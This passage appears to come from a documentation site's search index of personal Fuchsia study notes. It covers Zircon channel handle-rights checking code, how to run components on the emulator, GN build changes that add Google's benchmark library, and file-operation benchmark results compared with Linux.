GetDispatcherWithRights ( handle_value , ZX_RIGHT_WRITE , & channel ); MessagePacketPtr msg ; if (( options & ZX_CHANNEL_WRITE_USE_IOVEC ) != 0 ) { status = MessagePacket :: Create ( user_bytes . reinterpret < const zx_channel_iovec_t > (), num_bytes , num_handles , & msg ); } else { status = MessagePacket :: Create ( user_bytes . reinterpret < const char > (), num_bytes , num_handles , & msg ); } if ( num_handles > 0u ) { status = msg_put_handles ( up , msg . get (), user_handles , num_handles , static_cast < Dispatcher *> ( channel . get ())); } cleanup . cancel (); status = channel -> Write ( up -> get_koid (), ktl :: move ( msg )); return ZX_OK ; } typedef struct zx_handle_disposition { zx_handle_op_t operation ; zx_handle_t handle ; zx_obj_type_t type ; zx_rights_t rights ; zx_status_t result ; } zx_handle_disposition_t ; // In msg_put_handles() -> get_handle_for_message_locked() -> handle_checks_locked() // , the handle's rights must be reduced or keep same. static zx_status_t handle_checks_locked ( const Handle * handle , const Dispatcher * channel , zx_handle_op_t operation , zx_rights_t desired_rights , zx_obj_type_t type ) { if ( ! handle ) return ZX_ERR_BAD_HANDLE ; if ( ! handle -> HasRights ( ZX_RIGHT_TRANSFER )) return ZX_ERR_ACCESS_DENIED ; if ( handle -> dispatcher (). get () == channel ) return ZX_ERR_NOT_SUPPORTED ; if ( type != ZX_OBJ_TYPE_NONE && handle -> dispatcher () -> get_type () != type ) return ZX_ERR_WRONG_TYPE ; if ( operation != ZX_HANDLE_OP_MOVE && operation != ZX_HANDLE_OP_DUPLICATE ) return ZX_ERR_INVALID_ARGS ; if ( desired_rights != ZX_RIGHT_SAME_RIGHTS ) { if (( handle -> rights () & desired_rights ) != desired_rights ) { return ZX_ERR_INVALID_ARGS ; } } if (( operation == ZX_HANDLE_OP_DUPLICATE ) && ! handle -> HasRights ( ZX_RIGHT_DUPLICATE )) return ZX_ERR_ACCESS_DENIED ; return ZX_OK ; } For the process with the handle pointing to another end of the channel, the channel_read is simpler in rights checking. template < typename HandleInfoT > static zx_status_t channel_read ( zx_handle_t handle_value , uint32_t options , user_out_ptr < void > bytes , user_out_ptr < HandleInfoT > handles , uint32_t num_bytes , uint32_t num_handles , user_out_ptr < uint32_t > actual_bytes , user_out_ptr < uint32_t > actual_handles ) { auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < ChannelDispatcher > channel ; zx_status_t result = up -> handle_table (). GetDispatcherWithRights ( handle_value , ZX_RIGHT_READ , & channel ); // Currently MAY_DISCARD is the only allowable option. if ( options & ~ ZX_CHANNEL_READ_MAY_DISCARD ) return ZX_ERR_NOT_SUPPORTED ; MessagePacketPtr msg ; result = channel -> Read ( up -> get_koid (), & num_bytes , & num_handles , & msg , options & ZX_CHANNEL_READ_MAY_DISCARD ); // On ZX_ERR_BUFFER_TOO_SMALL, Read() gives us the size of the next message (which remains // unconsumed, unless |options| has ZX_CHANNEL_READ_MAY_DISCARD set). if ( actual_bytes ) { zx_status_t status = actual_bytes . copy_to_user ( num_bytes ); } if ( actual_handles ) { zx_status_t status = actual_handles . copy_to_user ( num_handles ); } if ( num_bytes > 0u ) { if ( msg -> CopyDataTo ( bytes . reinterpret < char > ()) != ZX_OK ) return ZX_ERR_INVALID_ARGS ; } // The documented public API states that that writing to the handles buffer // must happen after writing to the data buffer. if ( num_handles > 0u ) { zx_status_t status = msg_get_handles ( up , msg . get (), handles , num_handles ); } record_recv_msg_sz ( num_bytes ); return result ; } For the second question, the answer tends to be NO . But, currently, I am not so sure. For the third question, the answer is no. At least, we can see the transferable handles must go through rights checking.","title":"Handle management and rights."},{"location":"play/performance/","text":"Run Component How to create a component? Just follow the official tutorial is okay. How to run an example component? On Term 1 , use below commands. fx set workstation.x64 --with //examples/hello_world fx build fx list-packages # to check if hello-world is included fx vdl start -N --software-gpu # start the FEMU with network and software GPU Then, Term 1 will output the following. The last line tells us how to communicate to this device (emulator) using fx and ffx tools provided by Google. [ fvdl ] Using fuchsia build dir: \"/home/fuchsia/fuchsia/fuchsia/out/default\" [ fvdl ] Found Fuchsia root directory \"/home/fuchsia/fuchsia/fuchsia\" 2021 /09/05 12 :51:13 [ info ] FVD Properties: device_spec: { horizontal_resolution: 1280 vertical_resolution: 800 vm_heap: 192 ram: 8192 cache: 32 screen_density: 240 } fvm_size: \"2G\" gpu: \"swiftshader_indirect\" 2021 /09/05 12 :51:13 [ info ] images: using fvm tool from /home/fuchsia/fuchsia/fuchsia/out/default/host_x64/fvm 2021 /09/05 12 :51:13 [ info ] images: using zbi tool from /home/fuchsia/fuchsia/fuchsia/out/default/host_x64/zbi 2021 /09/05 12 :51:14 [ info ] Resizing /tmp/launcher1019998335/femu_fvm file to 2G 2021 /09/05 12 :51:14 [ info ] found fuchsia board architecture: x64 2021 /09/05 12 :51:14 [ info ] running on host architecture: amd64 2021 /09/05 12 :51:14 [ info ] device: DISPLAY = :0 2021 /09/05 12 :51:14 /home/fuchsia/fuchsia/fuchsia/prebuilt/third_party/aemu/linux-x64/emulator -feature VirtioInput,GLDirectMem,Vulkan,RefCountPipe,KVM -metrics-collection -no-hidpi-scaling -grpc 55477 -rtcfps 30 -gpu swiftshader_indirect -window-size 1280x800 -no-location-ui -fuchsia -kernel /tmp/vdl_staging_hxnUxq/femu_kernel -initrd /tmp/launcher1019998335/femu_zircona-ed25519 -m 8192M -vga none -device virtio-keyboard-pci -smp 4 ,threads = 2 -drive file = /tmp/launcher1019998335/femu_fvm,format = raw,if = none,id = vdisk -device virtio-blk-pci,drive = vdisk -serial stdio -machine q35 -device isa-debug-exit,iobase = 0xf4,iosize = 0x04 -enable-kvm -cpu host,migratable = no,+invtsc -device virtio_input_multi_touch_pci_1 -soundhw hda -netdev type = tap,ifname = qemu,id = net0,script = no,downscript = no -device virtio-net-pci,vectors = 8 ,netdev = net0,mac = 52 :54:00:63:5e:7a -append \"verbose kernel.serial=legacy TERM=xterm-256color kernel.entropy-mixin=42ac2452e99c1c979ebfca03bce0cbb14126e4021a6199ccfeca217999c0aaa0 kernel.halt-on-panic=true zircon.nodename=fuchsia-5254-0063-5e7a kernel.lockup-detector.critical-section-fatal-threshold-ms=0 kernel.lockup-detector.critical-section-threshold-ms=5000 kernel.lockup-detector.heartbeat-age-fatal-threshold-ms=0\" 2021 /09/05 12 :51:14 Starting emulator 2021 /09/05 12 :51:16 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:19 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:22 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:25 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:28 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:31 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:32 [ info ] Found device address: fe80::53d0:df2:3acd:baf6%brqemu 2021 /09/05 12 :51:32 Fuchsia Image version: 2021 -09-03T03:58:43+00:00 2021 /09/05 12 :51:32 Finished starting up and the device can be reached via ssh. 2021 /09/05 12 :51:32 From Start | Duration | Event Name 2021 /09/05 12 :51:32 19 .28 | 19 .28 | Fuchsiastart To support fx tools on emulator, please run \"fx set-device fuchsia-5254-0063-5e7a\" $ On Term 2 . fx set-device fuchsia-5254-0063-5e7a fx serve-updates Then, the output. 2021 -09-05 12 :55:10 [ serve-updates ] Discovery... 2021 -09-05 12 :55:11 [ serve-updates ] Device up 2021 -09-05 12 :55:11 [ serve-updates ] Registering devhost as update source 2021 -09-05 12 :55:11 [ serve-updates ] Ready to push packages! 2021 -09-05 12 :55:12 [ serve-updates ] Target uptime: 236 2021 -09-05 12 :55:37 [ pm auto ] adding client: [ fe80::53d0:df2:3acd:baf6%brqemu ] :46623 2021 -09-05 12 :55:37 [ pm auto ] client count: 1 On Term 3 , use ffx tool to further control and manage all devices, including NUC and FEMU. This command lists the components. fx ffx --target fuchsia-5254-0063-5e7a component list This runs the example component using URL. ffx --target fuchsia-5254-0063-5e7a component run fuchsia-pkg://fuchsia.com/hello-world#meta/hello-world-cpp.cm And if we want to see the log using fx , we can run fx log --only hello-world on Term 4 . [ 00262 .641762 ][ 25256 ][ 25258 ][ pkg-resolver ] INFO: updated local TUF metadata for \"fuchsia-pkg://devhost\" to version RepoVersions { root: 7 , timestamp: Some ( 1630674370 ) , snapshot: Some ( 1630674370 ) , targets: Some ( 1630674370 ) } while getting merkle for TargetPath ( \"hello-world/0\" ) [ 00262 .665920 ][ 25256 ][ 25258 ][ pkg-resolver ] INFO: Fetching blobs for fuchsia-pkg://devhost/hello-world: [ 3d6bb0e691e7c2591c37674c79e33eab6e5625f5756043463497b3e24f72c089, 4090c9eaf6476287a7904efc56443406cef53399bf205ac3155b4672359299f7, 4d36db65b5b9e8c4bf0d0af5a1b45a94da8f1ab004779b5ff1d9eee804dded38, 4e99f044c370ce1fbd42fb20725a5ae53c5cd8aea56309f5f1a35eb67a2c93ff, 5a758135fc9ba99df2b2bb539d4bbab38a43a69249d31e61730ece2ed7a189b7, 990d5a92889176cfd4564564e830201e37e4ab738d0286a3183b1e65fde871a0, ] [ 00262 .717444 ][ 25256 ][ 25258 ][ pkg-resolver ] INFO: resolved fuchsia-pkg://fuchsia.com/hello-world as fuchsia-pkg://devhost/hello-world to b09363cb388e98b85459ca091338e00ac66f523d9e2efb8754e0ac3f6ba8aac6 with TUF [ 00262 .729115 ][ 1186 ][ 1298 ][ ffx-laboratory:hello-world-cpp ] INFO: Hello, World! How to add a third party package to /bin or /boot/bin ? To build our third party packages and add one or more packages to the shell, which is convenient to run by bypassing the fx server and ffx device manager, we can follow the steps. Take the //third-party/benchmark , a Google's benchmark framework, as an example. Modify the GN build system. Modify //third-party/benchmark/BUILD.gn . diff --git a/BUILD.gn b/BUILD.gn index 4cb9f78..028fae1 100644 --- a/BUILD.gn +++ b/BUILD.gn @@ -2,14 +2,17 @@ # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. +import(\"//build/components.gni\") + config(\"benchmark_config\") { visibility = [ \":*\" ] include_dirs = [ \"include\" ] } -static_library(\"benchmark\") { - testonly = true +executable(\"benchmark_test_bin\") { + output_name = \"benchmark_test\" sources = [ + \"test/benchmark_test.cc\", \"src/benchmark.cc\", \"src/benchmark_register.cc\", \"src/colorprint.cc\", @@ -31,3 +34,7 @@ static_library(\"benchmark\") { ] configs += [ \"//build/config:Wno-conversion\" ] } + +fuchsia_shell_package(\"benchmark\") { + deps = [ \":benchmark_test_bin\" ] +} Modify //build/config/BUILD.gn . diff --git a/build/config/BUILD.gn b/build/config/BUILD.gn index ff00c465695..e432a8cefcf 100644 --- a/build/config/BUILD.gn +++ b/build/config/BUILD.gn @@ -983,6 +983,7 @@ config(\"Wno-conversion\") { \"//third_party/opus/*\", \"//third_party/rust_crates/compat/brotli:*\", \"//third_party/zstd:*\", + \"//third_party/benchmark:*\", \"//tools/bootserver_old:*\", \"//tools/fidlcat:*\", \"//tools/fidlcat/interception_tests:*\", Modify garnet/packages/prod/BUILD.gn . Here, I have no idea what should be in the garnet code area and what third party code should be configured in garnet . I see the sbase package is in this file so I just follow. diff --git a/garnet/packages/prod/BUILD.gn b/garnet/packages/prod/BUILD.gn index e96345106df..19f7abf9877 100644 --- a/garnet/packages/prod/BUILD.gn +++ b/garnet/packages/prod/BUILD.gn @@ -39,6 +39,7 @@ group(\"all\") { \"//garnet/packages/prod:network-speed-test\", \"//garnet/packages/prod:run\", \"//garnet/packages/prod:sbase\", + \"//garnet/packages/prod:benchmark\", \"//garnet/packages/prod:scenic\", \"//garnet/packages/prod:sched\", \"//garnet/packages/prod:setui_client\", @@ -164,6 +165,7 @@ group(\"cmdutils\") { \"//garnet/bin/uname\", \"//garnet/packages/prod:hwstress\", \"//garnet/packages/prod:sbase\", + \"//garnet/packages/prod:benchmark\", \"//garnet/packages/prod:sched\", ] } @@ -258,6 +260,11 @@ group(\"run\") { public_deps = [ \"//garnet/bin/run\" ] } +group(\"benchmark\") { + public_deps = [ \"//third_party/benchmark:benchmark\" ] + deps = [ \"//build/validate:non_production_tag\" ] +} + group(\"sbase\") { public_deps = [ \"//third_party/sbase:basename\", Fix the bug in the example of benchmark provided by Google. diff --git a/test/benchmark_test.cc b/test/benchmark_test.cc index d832f81..5ab2191 100644 --- a/test/benchmark_test.cc +++ b/test/benchmark_test.cc @@ -57,7 +57,7 @@ static void BM_Factorial(benchmark::State& state) { // Prevent compiler optimizations std::stringstream ss; ss << fac_42; - state.SetLabel(ss.str()); + state.SetLabel(ss.str().c_str()); } BENCHMARK(BM_Factorial); BENCHMARK(BM_Factorial)->UseRealTime(); @@ -67,7 +67,7 @@ static void BM_CalculatePiRange(benchmark::State& state) { while (state.KeepRunning()) pi = CalculatePi(state.range(0)); std::stringstream ss; ss << pi; - state.SetLabel(ss.str()); + state.SetLabel(ss.str().c_str()); } BENCHMARK_RANGE(BM_CalculatePiRange, 1, 1024 * 1024); Run benchmark_test , the name of the executable, in emulator shell. $ benchmark_test Run on ( 1 X 2592 .14 MHz CPU ) 2021 -09-06 11 :41:17 ***WARNING*** Library was built as DEBUG. Timings may be affected. Benchmark Time CPU Iterations ------------------------------------------------------------------------------- BM_Factorial 20 ns 20 ns 33472229 40320 BM_Factorial/real_time 20 ns 20 ns 35920865 40320 BM_CalculatePiRange/1 13 ns 13 ns 54041014 0 BM_CalculatePiRange/8 41 ns 41 ns 17306448 3 .28374 BM_CalculatePiRange/64 259 ns 259 ns 2660336 3 .15746 BM_CalculatePiRange/512 2016 ns 2016 ns 353513 3 .14355 BM_CalculatePiRange/4k 15967 ns 15967 ns 44053 3 .14184 BM_CalculatePiRange/32k 126546 ns 126546 ns 5487 3 .14162 BM_CalculatePiRange/256k 1012777 ns 1012781 ns 689 3 .1416 BM_CalculatePiRange/1024k 4095950 ns 4095971 ns 139 3 .14159 BM_CalculatePi/threads:8 789 ns 3954 ns 176368 BM_CalculatePi/threads:1 3975 ns 3975 ns 173389 BM_CalculatePi/threads:2 2001 ns 4003 ns 175916 BM_CalculatePi/threads:4 995 ns 3906 ns 177236 BM_CalculatePi/threads:8 753 ns 3841 ns 174008 BM_CalculatePi/threads:16 657 ns 4052 ns 166176 BM_CalculatePi/threads:32 256 ns 3899 ns 160064 BM_CalculatePi/threads:1 3941 ns 3941 ns 178150 BM_SetInsert/1024/1 62785 ns 62206 ns 11298 62 .7956kB/s 15 .6989k items/s BM_SetInsert/4k/1 252802 ns 251994 ns 2774 15 .5013kB/s 3 .87534k items/s BM_SetInsert/8k/1 529103 ns 526835 ns 1285 7 .41456kB/s 1 .85364k items/s BM_SetInsert/1024/8 68558 ns 68193 ns 10335 458 .256kB/s 114 .564k items/s BM_SetInsert/4k/8 268487 ns 266804 ns 2635 117 .127kB/s 29 .2818k items/s BM_SetInsert/8k/8 535696 ns 533019 ns 1323 58 .6283kB/s 14 .6571k items/s BM_SetInsert/1024/10 70453 ns 69789 ns 9930 559 .722kB/s 139 .931k items/s BM_SetInsert/4k/10 271270 ns 271624 ns 2553 143 .811kB/s 35 .9528k items/s BM_SetInsert/8k/10 535577 ns 533078 ns 1292 73 .2773kB/s 18 .3193k items/s BM_Sequential<std::vector<int>,int>/1 62 ns 62 ns 11171256 61 .4717MB/s 15 .3679M items/s BM_Sequential<std::vector<int>,int>/8 1510 ns 1510 ns 459005 20 .2076MB/s 5 .05191M items/s BM_Sequential<std::vector<int>,int>/64 4796 ns 4795 ns 146760 50 .9115MB/s 12 .7279M items/s BM_Sequential<std::vector<int>,int>/512 24337 ns 24337 ns 28851 80 .2538MB/s 20 .0635M items/s BM_Sequential<std::vector<int>,int>/1024 45693 ns 45693 ns 15478 85 .4887MB/s 21 .3722M items/s BM_Sequential<std::list<int>>/1 45 ns 45 ns 15432027 85 .3898MB/s 21 .3474M items/s BM_Sequential<std::list<int>>/8 1323 ns 1323 ns 495244 23 .0739MB/s 5 .76847M items/s BM_Sequential<std::list<int>>/64 11765 ns 11765 ns 60333 20 .7515MB/s 5 .18787M items/s BM_Sequential<std::list<int>>/512 94780 ns 94781 ns 7280 20 .6068MB/s 5 .1517M items/s BM_Sequential<std::list<int>>/1024 191727 ns 191728 ns 3681 20 .3739MB/s 5 .09349M items/s BM_Sequential<std::vector<int>, int>/512 24178 ns 24178 ns 29185 80 .7815MB/s 20 .1954M items/s BM_StringCompare/1 79 ns 79 ns 8741679 BM_StringCompare/8 83 ns 83 ns 7820085 BM_StringCompare/64 107 ns 107 ns 6417652 BM_StringCompare/512 323 ns 323 ns 2179937 Run our own component in /boot/bin . Copy the //example/hello_world/cpp to //src/bringup/bin/hello_world . Add the //src/bringup/bin/hello-world:bin to the dependencies of the zedboot group to //src/bringup/bundles/BUILD.gn . Then, we can even run the executable even with the bringup configuration. Write some micro-benches using the framework. Fuchsia and Linux have different ideas on the basic concepts. So, micro-benches using POSIX API cannot be ported. We must find the functional counterpart. Currently, we add a file operation test (the following code to //third_party/benchmark/syscall_test.cc ) as a micro-bench test. Then, we update the dependency of //third_party/benchmark/BUILD.gn . We can use dm <PATH> to see which file system is. I see /boot is memfs as expected, /data is minfs and others like /pkg and /bin are unknown. And the mkdir touch rm commands fail on these unknown areas. We might have to find out the reason . Also, we use more language-based standard library rather than something like unistd and libfdio for simplicity and generalization. #define USE_ZIRCON_ZX_SYSCALL #ifdef USE_ZIRCON_ZX_SYSCALL #include \"benchmark/benchmark_api.h\" #else #include \"benchmark/benchmark.h\" #endif #include <iostream> #include <fstream> namespace { // zircon use fdio.so library to do file operations, rather than posix api. // fdio knows how to speak to those other Fuchsia services over Channel IPC, // and provides a Posix-like layer for libc to expose. // Sockets are similarly implemented via fdio communicating with the userspace network stack. void file_write ( int file_size , benchmark :: State & state ) { char * buf = new char [ file_size ]; for ( int i = 0 ; i < file_size ; i ++ ) { if ( i % 2 == 0 ) buf [ i ] = 'A' ; else buf [ i ] = 'B' ; } std :: ofstream ofs ; state . ResumeTiming (); #ifdef USE_ZIRCON_ZX_SYSCALL ofs . open ( \"/data/test_file.txt\" ); #else ofs . open ( \"test_file.txt\" ); #endif if ( ofs . is_open ()) { ofs . write ( buf , file_size ); ofs . close (); } else { std :: cout << \"[error] in file write, cannot open file. \\n \" ; } state . PauseTiming (); delete [] buf ; } void file_read_rm ( int file_size , benchmark :: State & state ) { char * buf = new char [ file_size ]; std :: ifstream ifs ; state . ResumeTiming (); #ifdef USE_ZIRCON_ZX_SYSCALL ifs . open ( \"/data/test_file.txt\" ); #else ifs . open ( \"test_file.txt\" ); #endif if ( ifs . is_open ()) { ifs . read ( buf , file_size ); ifs . close (); } else { std :: cout << \"[error] in file read, cannot open file. \\n \" ; } state . PauseTiming (); delete [] buf ; } } static void BM_FileOp ( benchmark :: State & state ) { const int SZ_PAGE = 1024 ; while ( state . KeepRunning ()) { state . PauseTiming (); file_write ( state . range ( 0 ) * SZ_PAGE , state ); file_read_rm ( state . range ( 0 ) * SZ_PAGE , state ); state . ResumeTiming (); } } // test 1k, 10k and 1m file BENCHMARK ( BM_FileOp ) -> Arg ( 1 ) -> Arg ( 10 ) -> Arg ( 1000 ); BENCHMARK_MAIN (); #undef USE_ZIRCON_ZX_SYSCALL Then, run fx set core.qemu-x64 --with-base //bundles:tools and fx build . We use the core configuration because our NUC 9 can only run core configuration. Run on emulator to test it! $ benchmark Run on ( 1 X 2592 .13 MHz CPU ) 2021 -09-08 10 :42:36 ***WARNING*** Library was built as DEBUG. Timings may be affected. Benchmark Time CPU Iterations ----------------------------------------------------- BM_FileOp/1 29580839 ns 480812 ns 1000 BM_FileOp/10 36780568 ns 705535 ns 1035 BM_FileOp/1000 37059443 ns 8599233 ns 82 Run the same tests on both Linux and Zircon on the same Intel NUC (even with same devices). First, run it on Linux. 2021 -09-08T19:03:53+08:00 Running ./build/test/syscall_test Run on ( 12 X 4500 MHz CPU s ) CPU Caches: L1 Data 32 KiB ( x6 ) L1 Instruction 32 KiB ( x6 ) L2 Unified 256 KiB ( x6 ) L3 Unified 12288 KiB ( x1 ) Load Average: 0 .52, 0 .46, 0 .23 ***WARNING*** CPU scaling is enabled, the benchmark real time measurements may be noisy and will incur extra overhead. ***WARNING*** Library was built as DEBUG. Timings may be affected. --------------------------------------------------------- Benchmark Time CPU Iterations --------------------------------------------------------- BM_FileOp/1 36055 ns 26183 ns 26937 BM_FileOp/10 29221 ns 29032 ns 24282 BM_FileOp/1000 542094 ns 541968 ns 1243 Then, we must face the real block device. We just make a partition follow the instructions. How to run native debugger and tracer? Which part of Fuchsia consumes time? How does the kernel support the component manager?","title":"Run Self-built Component"},{"location":"play/performance/#run-component","text":"How to create a component? Just follow the official tutorial is okay. How to run an example component? On Term 1 , use below commands. fx set workstation.x64 --with //examples/hello_world fx build fx list-packages # to check if hello-world is included fx vdl start -N --software-gpu # start the FEMU with network and software GPU Then, Term 1 will output the following. The last line tells us how to communicate to this device (emulator) using fx and ffx tools provided by Google. [ fvdl ] Using fuchsia build dir: \"/home/fuchsia/fuchsia/fuchsia/out/default\" [ fvdl ] Found Fuchsia root directory \"/home/fuchsia/fuchsia/fuchsia\" 2021 /09/05 12 :51:13 [ info ] FVD Properties: device_spec: { horizontal_resolution: 1280 vertical_resolution: 800 vm_heap: 192 ram: 8192 cache: 32 screen_density: 240 } fvm_size: \"2G\" gpu: \"swiftshader_indirect\" 2021 /09/05 12 :51:13 [ info ] images: using fvm tool from /home/fuchsia/fuchsia/fuchsia/out/default/host_x64/fvm 2021 /09/05 12 :51:13 [ info ] images: using zbi tool from /home/fuchsia/fuchsia/fuchsia/out/default/host_x64/zbi 2021 /09/05 12 :51:14 [ info ] Resizing /tmp/launcher1019998335/femu_fvm file to 2G 2021 /09/05 12 :51:14 [ info ] found fuchsia board architecture: x64 2021 /09/05 12 :51:14 [ info ] running on host architecture: amd64 2021 /09/05 12 :51:14 [ info ] device: DISPLAY = :0 2021 /09/05 12 :51:14 /home/fuchsia/fuchsia/fuchsia/prebuilt/third_party/aemu/linux-x64/emulator -feature VirtioInput,GLDirectMem,Vulkan,RefCountPipe,KVM -metrics-collection -no-hidpi-scaling -grpc 55477 -rtcfps 30 -gpu swiftshader_indirect -window-size 1280x800 -no-location-ui -fuchsia -kernel /tmp/vdl_staging_hxnUxq/femu_kernel -initrd /tmp/launcher1019998335/femu_zircona-ed25519 -m 8192M -vga none -device virtio-keyboard-pci -smp 4 ,threads = 2 -drive file = /tmp/launcher1019998335/femu_fvm,format = raw,if = none,id = vdisk -device virtio-blk-pci,drive = vdisk -serial stdio -machine q35 -device isa-debug-exit,iobase = 0xf4,iosize = 0x04 -enable-kvm -cpu host,migratable = no,+invtsc -device virtio_input_multi_touch_pci_1 -soundhw hda -netdev type = tap,ifname = qemu,id = net0,script = no,downscript = no -device virtio-net-pci,vectors = 8 ,netdev = net0,mac = 52 :54:00:63:5e:7a -append \"verbose kernel.serial=legacy TERM=xterm-256color kernel.entropy-mixin=42ac2452e99c1c979ebfca03bce0cbb14126e4021a6199ccfeca217999c0aaa0 kernel.halt-on-panic=true zircon.nodename=fuchsia-5254-0063-5e7a kernel.lockup-detector.critical-section-fatal-threshold-ms=0 kernel.lockup-detector.critical-section-threshold-ms=5000 kernel.lockup-detector.heartbeat-age-fatal-threshold-ms=0\" 2021 /09/05 12 :51:14 Starting emulator 2021 /09/05 12 :51:16 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:19 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:22 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:25 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:28 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:31 [ info ] Waiting for emulator to start... 2021 /09/05 12 :51:32 [ info ] Found device address: fe80::53d0:df2:3acd:baf6%brqemu 2021 /09/05 12 :51:32 Fuchsia Image version: 2021 -09-03T03:58:43+00:00 2021 /09/05 12 :51:32 Finished starting up and the device can be reached via ssh. 2021 /09/05 12 :51:32 From Start | Duration | Event Name 2021 /09/05 12 :51:32 19 .28 | 19 .28 | Fuchsiastart To support fx tools on emulator, please run \"fx set-device fuchsia-5254-0063-5e7a\" $ On Term 2 . fx set-device fuchsia-5254-0063-5e7a fx serve-updates Then, the output. 2021 -09-05 12 :55:10 [ serve-updates ] Discovery... 2021 -09-05 12 :55:11 [ serve-updates ] Device up 2021 -09-05 12 :55:11 [ serve-updates ] Registering devhost as update source 2021 -09-05 12 :55:11 [ serve-updates ] Ready to push packages! 2021 -09-05 12 :55:12 [ serve-updates ] Target uptime: 236 2021 -09-05 12 :55:37 [ pm auto ] adding client: [ fe80::53d0:df2:3acd:baf6%brqemu ] :46623 2021 -09-05 12 :55:37 [ pm auto ] client count: 1 On Term 3 , use ffx tool to further control and manage all devices, including NUC and FEMU. This command lists the components. fx ffx --target fuchsia-5254-0063-5e7a component list This runs the example component using URL. ffx --target fuchsia-5254-0063-5e7a component run fuchsia-pkg://fuchsia.com/hello-world#meta/hello-world-cpp.cm And if we want to see the log using fx , we can run fx log --only hello-world on Term 4 . [ 00262 .641762 ][ 25256 ][ 25258 ][ pkg-resolver ] INFO: updated local TUF metadata for \"fuchsia-pkg://devhost\" to version RepoVersions { root: 7 , timestamp: Some ( 1630674370 ) , snapshot: Some ( 1630674370 ) , targets: Some ( 1630674370 ) } while getting merkle for TargetPath ( \"hello-world/0\" ) [ 00262 .665920 ][ 25256 ][ 25258 ][ pkg-resolver ] INFO: Fetching blobs for fuchsia-pkg://devhost/hello-world: [ 3d6bb0e691e7c2591c37674c79e33eab6e5625f5756043463497b3e24f72c089, 4090c9eaf6476287a7904efc56443406cef53399bf205ac3155b4672359299f7, 4d36db65b5b9e8c4bf0d0af5a1b45a94da8f1ab004779b5ff1d9eee804dded38, 4e99f044c370ce1fbd42fb20725a5ae53c5cd8aea56309f5f1a35eb67a2c93ff, 5a758135fc9ba99df2b2bb539d4bbab38a43a69249d31e61730ece2ed7a189b7, 990d5a92889176cfd4564564e830201e37e4ab738d0286a3183b1e65fde871a0, ] [ 00262 .717444 ][ 25256 ][ 25258 ][ pkg-resolver ] INFO: resolved fuchsia-pkg://fuchsia.com/hello-world as fuchsia-pkg://devhost/hello-world to b09363cb388e98b85459ca091338e00ac66f523d9e2efb8754e0ac3f6ba8aac6 with TUF [ 00262 .729115 ][ 1186 ][ 1298 ][ ffx-laboratory:hello-world-cpp ] INFO: Hello, World! How to add a third party package to /bin or /boot/bin ? To build our third party packages and add one or more packages to the shell, which is convenient to run by bypassing the fx server and ffx device manager, we can follow the steps. Take the //third-party/benchmark , a Google's benchmark framework, as an example. Modify the GN build system. Modify //third-party/benchmark/BUILD.gn . diff --git a/BUILD.gn b/BUILD.gn index 4cb9f78..028fae1 100644 --- a/BUILD.gn +++ b/BUILD.gn @@ -2,14 +2,17 @@ # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. +import(\"//build/components.gni\") + config(\"benchmark_config\") { visibility = [ \":*\" ] include_dirs = [ \"include\" ] } -static_library(\"benchmark\") { - testonly = true +executable(\"benchmark_test_bin\") { + output_name = \"benchmark_test\" sources = [ + \"test/benchmark_test.cc\", \"src/benchmark.cc\", \"src/benchmark_register.cc\", \"src/colorprint.cc\", @@ -31,3 +34,7 @@ static_library(\"benchmark\") { ] configs += [ \"//build/config:Wno-conversion\" ] } + +fuchsia_shell_package(\"benchmark\") { + deps = [ \":benchmark_test_bin\" ] +} Modify //build/config/BUILD.gn . diff --git a/build/config/BUILD.gn b/build/config/BUILD.gn index ff00c465695..e432a8cefcf 100644 --- a/build/config/BUILD.gn +++ b/build/config/BUILD.gn @@ -983,6 +983,7 @@ config(\"Wno-conversion\") { \"//third_party/opus/*\", \"//third_party/rust_crates/compat/brotli:*\", \"//third_party/zstd:*\", + \"//third_party/benchmark:*\", \"//tools/bootserver_old:*\", \"//tools/fidlcat:*\", \"//tools/fidlcat/interception_tests:*\", Modify garnet/packages/prod/BUILD.gn . Here, I have no idea what should be in the garnet code area and what third party code should be configured in garnet . I see the sbase package is in this file so I just follow. diff --git a/garnet/packages/prod/BUILD.gn b/garnet/packages/prod/BUILD.gn index e96345106df..19f7abf9877 100644 --- a/garnet/packages/prod/BUILD.gn +++ b/garnet/packages/prod/BUILD.gn @@ -39,6 +39,7 @@ group(\"all\") { \"//garnet/packages/prod:network-speed-test\", \"//garnet/packages/prod:run\", \"//garnet/packages/prod:sbase\", + \"//garnet/packages/prod:benchmark\", \"//garnet/packages/prod:scenic\", \"//garnet/packages/prod:sched\", \"//garnet/packages/prod:setui_client\", @@ -164,6 +165,7 @@ group(\"cmdutils\") { \"//garnet/bin/uname\", \"//garnet/packages/prod:hwstress\", \"//garnet/packages/prod:sbase\", + \"//garnet/packages/prod:benchmark\", \"//garnet/packages/prod:sched\", ] } @@ -258,6 +260,11 @@ group(\"run\") { public_deps = [ \"//garnet/bin/run\" ] } +group(\"benchmark\") { + public_deps = [ \"//third_party/benchmark:benchmark\" ] + deps = [ \"//build/validate:non_production_tag\" ] +} + group(\"sbase\") { public_deps = [ \"//third_party/sbase:basename\", Fix the bug in the example of benchmark provided by Google. diff --git a/test/benchmark_test.cc b/test/benchmark_test.cc index d832f81..5ab2191 100644 --- a/test/benchmark_test.cc +++ b/test/benchmark_test.cc @@ -57,7 +57,7 @@ static void BM_Factorial(benchmark::State& state) { // Prevent compiler optimizations std::stringstream ss; ss << fac_42; - state.SetLabel(ss.str()); + state.SetLabel(ss.str().c_str()); } BENCHMARK(BM_Factorial); BENCHMARK(BM_Factorial)->UseRealTime(); @@ -67,7 +67,7 @@ static void BM_CalculatePiRange(benchmark::State& state) { while (state.KeepRunning()) pi = CalculatePi(state.range(0)); std::stringstream ss; ss << pi; - state.SetLabel(ss.str()); + state.SetLabel(ss.str().c_str()); } BENCHMARK_RANGE(BM_CalculatePiRange, 1, 1024 * 1024); Run benchmark_test , the name of the 